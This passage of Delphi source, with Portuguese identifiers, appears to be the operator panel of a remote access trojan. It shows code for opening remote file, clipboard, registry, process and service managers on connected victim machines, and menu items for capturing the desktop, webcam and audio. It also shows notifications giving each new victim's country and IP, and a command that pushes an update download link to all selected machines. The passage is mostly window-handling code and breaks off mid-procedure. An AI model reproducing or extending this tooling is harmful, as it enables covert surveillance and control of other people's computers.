    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormFileManager(ConAux.FormFileManager).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormFileManager(ConAux.FormFileManager).Align := alClient;
      TFormFileManager(ConAux.FormFileManager).BorderStyle := bsNone;
    end else
    begin
      TFormFileManager(ConAux.FormFileManager).Parent := nil;
      TFormFileManager(ConAux.FormFileManager).Align := alNone;
      TFormFileManager(ConAux.FormFileManager).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormFileManager(ConAux.FormFileManager).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormFileManager(ConAux.FormFileManager).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;

  TFormFileManager(ConAux.FormFileManager).Caption := traduzidos[388] + ' (' + ConAux.NomeDoServidor + ')';
  TFormFileManager(ConAux.FormFileManager).Show;
end;

procedure TFormMain.Gerenciadordearquivos1Click(Sender: TObject);
var
  NovaJanelaFileManager: TFormFileManager;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirFileManager(ConAux);
end;

procedure TFormMain.AbrirClipboard(ConAux: TConexaoNew);
var
  NovaJanelaClipboard: TFormClipboard;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormClipboard <> nil then
  begin
    if TFormClipboard(ConAux.FormClipboard).Visible then
    begin
      TFormClipboard(ConAux.FormClipboard).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormClipBoard(ConAux.FormClipBoard).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormClipBoard(ConAux.FormClipBoard).Align := alClient;
      TFormClipBoard(ConAux.FormClipBoard).BorderStyle := bsNone;
    end else
    begin
      TFormClipBoard(ConAux.FormClipBoard).Parent := nil;
      TFormClipBoard(ConAux.FormClipBoard).Align := alNone;
      TFormClipBoard(ConAux.FormClipBoard).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaClipboard := TFormClipboard.Create(self, ConAux);
    ConAux.FormClipboard := NovaJanelaClipboard;
    NovaJanelaClipboard.Caption := traduzidos[398] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormClipBoard(ConAux.FormClipBoard).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormClipBoard(ConAux.FormClipBoard).Align := alClient;
      TFormClipBoard(ConAux.FormClipBoard).BorderStyle := bsNone;
    end else
    begin
      TFormClipBoard(ConAux.FormClipBoard).Parent := nil;
      TFormClipBoard(ConAux.FormClipBoard).Align := alNone;
      TFormClipBoard(ConAux.FormClipBoard).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormClipboard(ConAux.FormClipboard).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormClipboard(ConAux.FormClipboard).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;

  TFormClipboard(ConAux.FormClipboard).Caption := traduzidos[398] + ' (' + ConAux.NomeDoServidor + ')';
  TFormClipboard(ConAux.FormClipboard).Show;
end;

procedure TFormMain.Gerenciadordeclipboard1Click(Sender: TObject);
var
  NovaJanelaClipboard: TFormClipboard;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirClipboard(ConAux);
end;

procedure TFormMain.AbrirJanelas(ConAux: TConexaoNew);
var
  NovaJanelaWindows: TFormWindows;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormWindows <> nil then
  begin
    if TFormWindows(ConAux.FormWindows).Visible then
    begin
      TFormWindows(ConAux.FormWindows).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormWindows(ConAux.FormWindows).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormWindows(ConAux.FormWindows).Align := alClient;
      TFormWindows(ConAux.FormWindows).BorderStyle := bsNone;
    end else
    begin
      TFormWindows(ConAux.FormWindows).Parent := nil;
      TFormWindows(ConAux.FormWindows).Align := alNone;
      TFormWindows(ConAux.FormWindows).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaWindows := TFormWindows.Create(self, ConAux);
    ConAux.FormWindows := NovaJanelaWindows;
    NovaJanelaWindows.Caption := traduzidos[249] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormWindows(ConAux.FormWindows).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormWindows(ConAux.FormWindows).Align := alClient;
      TFormWindows(ConAux.FormWindows).BorderStyle := bsNone;
    end else
    begin
      TFormWindows(ConAux.FormWindows).Parent := nil;
      TFormWindows(ConAux.FormWindows).Align := alNone;
      TFormWindows(ConAux.FormWindows).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormWindows(ConAux.FormWindows).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormWindows(ConAux.FormWindows).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;

  TFormWindows(ConAux.FormWindows).Caption := traduzidos[249] + ' (' + ConAux.NomeDoServidor + ')';
  TFormWindows(ConAux.FormWindows).Show;
end;

procedure TFormMain.Gerenciadordejanelas1Click(Sender: TObject);
var
  NovaJanelaWindows: TFormWindows;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirJanelas(ConAux);
end;

procedure TFormMain.Gerenciadordeprocessos1Click(Sender: TObject);
var
  NovaJanelaProcessos: TFormProcessos;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;

  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirProcessos(ConAux);
end;

procedure TFormMain.AbrirRegistro(ConAux: TConexaoNew);
var
  NovaJanelaRegedit: TFormRegedit;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormRegedit <> nil then
  begin
    if TFormRegedit(ConAux.FormRegedit).Visible then
    begin
      TFormRegedit(ConAux.FormRegedit).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormRegedit(ConAux.FormRegedit).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormRegedit(ConAux.FormRegedit).Align := alClient;
      TFormRegedit(ConAux.FormRegedit).BorderStyle := bsNone;
    end else
    begin
      TFormRegedit(ConAux.FormRegedit).Parent := nil;
      TFormRegedit(ConAux.FormRegedit).Align := alNone;
      TFormRegedit(ConAux.FormRegedit).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaRegedit := TFormRegedit.Create(self, ConAux);
    ConAux.FormRegedit := NovaJanelaRegedit;
    NovaJanelaRegedit.Caption := traduzidos[303] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormRegedit(ConAux.FormRegedit).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormRegedit(ConAux.FormRegedit).Align := alClient;
      TFormRegedit(ConAux.FormRegedit).BorderStyle := bsNone;
    end else
    begin
      TFormRegedit(ConAux.FormRegedit).Parent := nil;
      TFormRegedit(ConAux.FormRegedit).Align := alNone;
      TFormRegedit(ConAux.FormRegedit).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormRegedit(ConAux.FormRegedit).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormRegedit(ConAux.FormRegedit).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormRegedit(ConAux.FormRegedit).Caption := traduzidos[303] + ' (' + ConAux.NomeDoServidor + ')';
  TFormRegedit(ConAux.FormRegedit).Show;
end;

procedure TFormMain.Gerenciadorderegistros1Click(Sender: TObject);
var
  NovaJanelaRegedit: TFormRegedit;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirRegistro(ConAux);
end;

procedure TFormMain.AbrirServicos(ConAux: TConexaoNew);
var
  NovaJanelaServices: TFormServices;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormServices <> nil then
  begin
    if TFormServices(ConAux.FormServices).Visible then
    begin
      TFormServices(ConAux.FormServices).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormServices(ConAux.FormServices).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormServices(ConAux.FormServices).Align := alClient;
      TFormServices(ConAux.FormServices).BorderStyle := bsNone;
    end else
    begin
      TFormServices(ConAux.FormServices).Parent := nil;
      TFormServices(ConAux.FormServices).Align := alNone;
      TFormServices(ConAux.FormServices).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaServices := TFormServices.Create(self, ConAux);
    ConAux.FormServices := NovaJanelaServices;
    NovaJanelaServices.Caption := traduzidos[279] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormServices(ConAux.FormServices).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormServices(ConAux.FormServices).Align := alClient;
      TFormServices(ConAux.FormServices).BorderStyle := bsNone;
    end else
    begin
      TFormServices(ConAux.FormServices).Parent := nil;
      TFormServices(ConAux.FormServices).Align := alNone;
      TFormServices(ConAux.FormServices).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormServices(ConAux.FormServices).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormServices(ConAux.FormServices).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormServices(ConAux.FormServices).Caption := traduzidos[279] + ' (' + ConAux.NomeDoServidor + ')';
  TFormServices(ConAux.FormServices).Show;
end;

procedure TFormMain.Gerenciadordeservios1Click(Sender: TObject);
var
  NovaJanelaServices: TFormServices;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirServicos(ConAux);
end;

procedure TFormMain.AbrirProcessos(ConAux: TConexaoNew);
var
  NovaJanelaProcessos: TFormProcessos;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormProcessos <> nil then
  begin
    if TFormProcessos(ConAux.FormProcessos).Visible then
    begin
      TFormProcessos(ConAux.FormProcessos).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormProcessos(ConAux.FormProcessos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormProcessos(ConAux.FormProcessos).Align := alClient;
      TFormProcessos(ConAux.FormProcessos).BorderStyle := bsNone;
    end else
    begin
      TFormProcessos(ConAux.FormProcessos).Parent := nil;
      TFormProcessos(ConAux.FormProcessos).Align := alNone;
      TFormProcessos(ConAux.FormProcessos).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaProcessos := TFormProcessos.Create(self, ConAux);
    ConAux.FormProcessos := NovaJanelaProcessos;
    NovaJanelaProcessos.Caption := traduzidos[208] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormProcessos(ConAux.FormProcessos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormProcessos(ConAux.FormProcessos).Align := alClient;
      TFormProcessos(ConAux.FormProcessos).BorderStyle := bsNone;
    end else
    begin
      TFormProcessos(ConAux.FormProcessos).Parent := nil;
      TFormProcessos(ConAux.FormProcessos).Align := alNone;
      TFormProcessos(ConAux.FormProcessos).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormProcessos(ConAux.FormProcessos).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormProcessos(ConAux.FormProcessos).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormProcessos(ConAux.FormProcessos).Caption := traduzidos[208] + ' (' + ConAux.NomeDoServidor + ')';
  TFormProcessos(ConAux.FormProcessos).Show;
end;

function TFormMain.GetAllNodes: TNodeArray;
var
  Run: PVirtualNode;
  Counter: Cardinal;
begin
  SetLength(Result, MainList.TotalCount);
  if MainList.TotalCount > 0 then
  begin
    Run := MainList.GetFirst(True);
    Counter := 0;
    while Assigned(Run) do
    begin
      Result[Counter] := Run;
      Inc(Counter);
      Run := MainList.GetNext(Run, True);
    end;
    if Integer(Counter) < Length(Result) then SetLength(Result, Counter);
  end;
end;

procedure TFormMain.AtualizarPopupMenu;
var
  i: integer;
begin
  if ControlCenter = True then
  begin
    for I := funes1.Count - 1 downto 0 do funes1.Items[i].Visible := False;
    ControlCenter1.Visible := ControlCenter;
    Capturardesktop1.Visible := ControlCenter;
    Capturarwebcam1.Visible := ControlCenter;
    Capturarudio1.Visible := ControlCenter;
  end else
  begin
    for I := funes1.Count - 1 downto 0 do funes1.Items[i].Visible := True;
    ControlCenter1.Visible := ControlCenter;
  end;
end;

procedure TFormMain.Linkhttp1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
  application.ProcessMessages;
  name := LastUpdateLink;
  if inputquery(pwidechar(traduzidos[175]), pwidechar(traduzidos[174]), name) = false then exit;
  LastUpdateLink := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(UPDATESERVERLINK + '|' + LastUpdateLink);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.AbrirDispositivos(ConAux: TConexaoNew);
var
  NovaJanelaListarDispositivos: TFormListarDispositivos;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormListarDispositivos <> nil then
  begin
    if TFormListarDispositivos(ConAux.FormListarDispositivos).Visible then
    begin
      TFormListarDispositivos(ConAux.FormListarDispositivos).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormListarDispositivos(ConAux.FormListarDispositivos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormListarDispositivos(ConAux.FormListarDispositivos).Align := alClient;
      TFormListarDispositivos(ConAux.FormListarDispositivos).BorderStyle := bsNone;
    end else
    begin
      TFormListarDispositivos(ConAux.FormListarDispositivos).Parent := nil;
      TFormListarDispositivos(ConAux.FormListarDispositivos).Align := alNone;
      TFormListarDispositivos(ConAux.FormListarDispositivos).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaListarDispositivos := TFormListarDispositivos.Create(self, ConAux);
    ConAux.FormListarDispositivos := NovaJanelaListarDispositivos;
    NovaJanelaListarDispositivos.Caption := traduzidos[417] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormListarDispositivos(ConAux.FormListarDispositivos).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormListarDispositivos(ConAux.FormListarDispositivos).Align := alClient;
      TFormListarDispositivos(ConAux.FormListarDispositivos).BorderStyle := bsNone;
    end else
    begin
      TFormListarDispositivos(ConAux.FormListarDispositivos).Parent := nil;
      TFormListarDispositivos(ConAux.FormListarDispositivos).Align := alNone;
      TFormListarDispositivos(ConAux.FormListarDispositivos).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormListarDispositivos(ConAux.FormListarDispositivos).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormListarDispositivos(ConAux.FormListarDispositivos).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormListarDispositivos(ConAux.FormListarDispositivos).Caption := traduzidos[417] + ' (' + ConAux.NomeDoServidor + ')';
  TFormListarDispositivos(ConAux.FormListarDispositivos).Show;
end;

procedure TFormMain.Listardispositivos1Click(Sender: TObject);
var
  NovaJanelaListarDispositivos: TFormListarDispositivos;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirDispositivos(ConAux);
end;

procedure TFormMain.ListView1AdvancedCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
  var DefaultDraw: Boolean);
begin
  Sender.Canvas.Font.Color := MainColor;
end;

procedure TFormMain.Abrirpastadedownloads1Click(Sender: TObject);
var
  TempDir: string;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + ConAux.NomeDoServidor;
  ForceDirectories(TempDir);
  ShellExecute(0,
               'open',
               'explorer.exe',
               pWideChar(TempDir),
               '',
               SW_NORMAL);
end;

procedure TFormMain.Abrirpginadainternet1Click(Sender: TObject);
var
  i: integer;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  Name: string;
begin
  application.ProcessMessages;
  name := LastOpenWeb;
  if inputquery(pwidechar(traduzidos[181]), pwidechar(traduzidos[182]), name) = false then exit;
  LastOpenWeb := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(OPENWEB + DelimitadorComandos + LastOpenWeb);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

type
  TCheckConnection = class(TThread)
  private
    ConAux: TConexaoNew;
  protected
    procedure Execute; override;
  public
    constructor Create(xConAux: TConexaoNew);
  end;

constructor TCheckConnection.Create(xConAux: TConexaoNew);
begin
  ConAux := xConAux;
  inherited Create(True);
end;

procedure TCheckConnection.Execute;
begin
  sleep(20000);
  if (ConAux <> nil) and (ConAux.ValidConnection = False) and (ConAux.MasterIdentification = 1234567890) then
    ConAux.Connection.Disconnect;
end;

type
  TDisconnect = class(TThread)
  private
    ConAux: TConexaoNew;
  protected
    procedure Execute; override;
  public
    constructor Create(xConAux: TConexaoNew);
  end;

constructor TDisconnect.Create(xConAux: TConexaoNew);
begin
  ConAux := xConAux;
  inherited Create(True);
end;

procedure TDisconnect.Execute;
begin
  sleep(5000);
  if ConAux <> nil then try ConAux.Connection.Disconnect; except end;
end;

procedure TFormMain.ApplicationEvents1Message(var Msg: tagMSG;
  var Handled: Boolean);
var
  i, s, FlagID, TempInt: integer;
  Flag: TBitmap;
  Jpg: TJpegImage;
  TempStr, localip, NameServer: string;
  ConAux: TConexaoNew;
  Node, TempNode: pVirtualNode;
  TempConAux: TConexaoNew;
  CheckConnection: TCheckConnection;
  p: pointer;
  resStream: TResourceStream;
  D: TDisconnect;
  NovaJanelaAll: TFormAll;
begin
(*
  if Msg.message = WM_INSERTLIST then
  begin
    ConAux := TConexaoNew(Msg.lparam);
    if Assigned(ConAux.Node) then Exit;

    Node := GetNodeGroup(ConAux);

    // Para versões privadas, não use assim...
    //ConAux.Node := MainList.InsertNode(Node, amAddChildFirst, TObject(ConAux)); {MainList.AddChild(Node, TObject(ConAux))};

    // Use a parte de baixo...
    ConAux.Node := InsertServer(MainList, Node, TObject(ConAux));
    MainList.Refresh;

    if ConAux.Node = nil then
    begin
      D := TDisconnect.Create(ConAux);
      D.Resume;
      Exit;
    end;

    if Node.ChildCount > 0 then MainList.IsVisible[Node] := True;
    if Node.ChildCount = 1 then MainList.Expanded[Node] := True;

    NovaJanelaAll := TFormAll.Create(FormMain, ConAux);
    ConAux.FormAll := NovaJanelaAll;

    FormMain.AtualizarQuantidade;

    ConAux.Item := TempListViewLogs.Items.Add;
    ConAux.Item.Caption := ConAux.NomeDoServidor;
    ConAux.Item.SubItems.Add(DateTimeToStr(Now));
    ConAux.Item.SubItems.Add('');
    ConAux.Item.ImageIndex := ConAux.ImagemBandeira;

    if (FormConnectionsLog.Visible) and
       ((FormConnectionsLog.RadioGroup1.ItemIndex = 0) or
        (posex(Today, DateTimeToStr(FormConnectionsLog.sMonthCalendar1.CalendarDate)) > 0)) then
    begin
      SendMessage(FormConnectionsLog.Handle, 5556, integer(ConAux.Item), 0);
      Application.ProcessMessages;
    end;

  end else
*)
  if Msg.message = WM_MAININFO then
  begin
    s := integer(Msg.wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(Msg.lparam), s);

    NameServer := Copy(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    Delete(TempStr, 1, posex(delimitadorComandos, TempStr) - 1);
    Delete(TempStr, 1, length(delimitadorComandos));

    FlagID := StrToInt(Copy(TempStr, 1, posex('|', TempStr) - 1));
    Delete(TempStr, 1, posex('|', TempStr));

    Flag := TBitmap.Create;
    Flags32.GetBitmap(FlagID, Flag);
    MSN.FlagImage.Assign(Flag);
    Flag.Free;

    if FileExists(ExtractFilePath(ParamStr(0)) + 'NotifyImages\' + NameServer + '.jpg') then
    begin
      //Adiciona a imagem no MSN form
      Jpg := TJpegImage.Create;
      Jpg.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'NotifyImages\' + NameServer + '.jpg');
      MSN.NotifyImage.Assign(Jpg);
      Jpg.Free;
    end else MSN.NotifyImage := nil;

    MSN.Text := TempStr;
    MSN.ShowPopUp;
  end else

  if Msg.message = WM_SHOWDISCONNECT then
  begin
    s := integer(Msg.wParam);
    SetLength(TempStr, s div 2);
    copymemory(@TempStr[1], pointer(Msg.lparam), s);

    FlagID := StrToInt(Copy(TempStr, 1, posex('|', TempStr) - 1));
    Delete(TempStr, 1, posex('|', TempStr));

    Flag := TBitmap.Create;
    Flags32.GetBitmap(FlagID, Flag);
    ConnectionClossed.FlagImage.Assign(Flag);
    Flag.Free;

    ConnectionClossed.Text := TempStr;
    ConnectionClossed.ShowPopUp;
  end else

  if Msg.message = WM_INSERTNODE then
  begin
    ConAux := TConexaoNew(Msg.lparam);
    if Assigned(ConAux.Node) = False then Exit;

    if TrayIcon1.Visible then
    begin
      TrayIcon1.BalloonFlags := bfInfo;
      TrayIcon1.BalloonTitle := NomeDoPrograma + ' ' + VersaoDoPrograma;
      TrayIcon1.BalloonHint := ConAux.NomeDoServidor + #13#10 + ConAux.Pais + ': ' + ConAux.IPWAN;
      TrayIcon1.ShowBalloonHint;
    end;

    if VNotify then
    begin
      TempStr := ConAux.NomeDoServidor + DelimitadorComandos + IntToStr(ConAux.ImagemBandeira) + '|' + ConAux.NomeDoServidor + #13#10 + 'IP: ' + ConAux.IPWAN;
      TempInt := Length(TempStr) * 2;
      GetMem(p, TempInt);
      CopyMemory(p, @TempStr[1], TempInt);
      PostMessage(FormMain.Handle, WM_MAININFO, TempInt, integer(p));
      Application.ProcessMessages;
    end;

    if SNotify = True then
    try
      if fileexists(SoundFile) = True then
      try
        PlaySound(pchar(SoundFile), 0, SND_ASYNC);
        except
        deletefile(SoundFile);
      end else
      begin
        SoundFile := ExtractFilePath(paramstr(0)) + 'sound.wav';
        resStream := TResourceStream.Create(hInstance, 'SOUND', 'soundfile');
        resStream.SaveToFile(SoundFile);
        resStream.Free;
        try
          MMSystem.PlaySound(pchar(SoundFile), 0, SND_ASYNC);
          except
          deletefile(SoundFile);
        end;
      end;
      finally
    end;

  end else

  if Msg.message = WM_DELETENODE then
  begin
    ConAux := TConexaoNew(Msg.lparam);
    Node := ConAux.Node;
    TempNode := Node.Parent;

    MainList.DeleteNode(Node);
    if TempNode.ChildCount <= 0 then MainList.isVisible[TempNode] := False;

    ConAux.Item.SubItems.Strings[1] := DateTimeToStr(now);

    if (FormConnectionsLog.Visible) and
       ((FormConnectionsLog.RadioGroup1.ItemIndex = 0) or
        (posex(Today, DateTimeToStr(FormConnectionsLog.sMonthCalendar1.CalendarDate)) > 0)) then
    begin
      for i := FormConnectionsLog.ListView1.Items.Count - 1 downto 0 do
      if (FormConnectionsLog.ListView1.Items.Item[i].Caption = ConAux.Item.Caption) and
         (FormConnectionsLog.ListView1.Items.Item[i].SubItems.Strings[0] = ConAux.Item.SubItems.Strings[0]) then
      begin
        FormConnectionsLog.ListView1.Items.Item[i].SubItems.Strings[1] := ConAux.Item.SubItems.Strings[1];
        break;
      end;
    end;

    MainList.Refresh;
    AtualizarQuantidade;
  end else

  if Msg.message = WM_STARTMAIN then
  begin
    if ShowInfoPanel = True then ShowFrameBar(True);

    Application.CreateForm(TFormUpdateSkin, FormUpdateSkin);
    try
      FormUpdateSkin.Show;
      finally
      FormUpdateSkin.Close;
      FormUpdateSkin.Release;
      FormUpdateSkin := nil;
    end;

    localip := GetIPAddress;
    while posex('|', PortList) > 0 do
    begin
      try
        i := StrToInt(copy(PortList, 1, posex('|', PortList) - 1));
        except
        i := 0;
